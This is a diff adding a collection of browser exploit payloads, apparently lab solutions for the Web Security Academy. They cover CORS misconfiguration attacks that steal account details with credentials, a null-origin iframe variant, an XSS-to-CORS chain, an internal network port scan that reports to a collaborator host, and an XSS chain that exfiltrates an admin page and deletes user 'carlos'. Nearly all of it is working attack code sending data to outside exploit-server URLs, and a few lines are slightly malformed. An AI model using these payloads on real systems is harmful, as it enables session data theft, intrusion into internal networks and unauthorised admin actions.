@@ -1,0 +1,132 @@
+------------------ reflected origin 
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://acd51f7f1ec2bc8ec0539fcf00f20080.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script> 
+
+
+------------------ null origin 
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+   var req = new XMLHttpRequest ();
+   req.onload = reqListener;
+   req.open('get','https://ac2c1fe41f394850c04e50db00c0009d.web-security-academy.net//accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe>
+
+--------------- XSS based, CORS trusts subdomains and http 
+
+<script>
+   document.location="http://stock.ac311f091e34dd2ec0b07047008b0018.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac311f091e34dd2ec0b07047008b0018.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ace91fe51e80dd54c049701f0173004d.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
+
+
+
+-------------------------------------------------------- Internal network pivoting 
+---------IP scan, then send valid IP to collaborator
+
+<script>
+var q = [], collaboratorURL = 'http://exploit-acbe1ff11ef67113c0e70b6f01df005b.web-security-academy.net/';
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(wait){
+    fetchUrl(url,wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+for(i=1;i<=20;i++){
+  if(q.length)q.shift()(i*100);
+}
+function fetchUrl(url, wait){
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+  }
+  ))
+  .catch(e => {
+  if(q.length) {
+    q.shift()(wait);
+  }
+  });
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()(wait);
+  }
+  }, wait);
+}
+</script> 
+
+---------- PART 2 insert XSS in username field, and test outbound interaction
+
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>'); // -->  xss(http://192.168.0.137:8080, textorespuestaIpencontrada, '"><img src='http://exploit-ace51fcd1eebcb06c0dd84ad017a001f.web-security-academy.net/?foundXSS=1>) 
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.195:8080", http://exploit-acbe1ff11ef67113c0e70b6f01df005b.web-security-academy.net/");
+</script> 
+
+
+--------- STEP 3 Recover admin panel, and send HTML page URIencoded in "code parameter"
+
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+function fetchUrl(url, collaboratorURL){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.195:8080", "http://exploit-acbe1ff11ef67113c0e70b6f01df005b.web-security-academy.net/");
+</script>
+
+
+--------- STEP 4 Delete username, accesing Delete Form from /admin, and setting its value to Carlos, then submit the form 
+
+
+<script>
+function xss(url, text, vector) {
+  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+  fetch(url).then(r=>r.text().then(text=>
+  {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+  }
+  ))
+}
+
+fetchUrl("http://192.168.0.195:8080");
+</script>
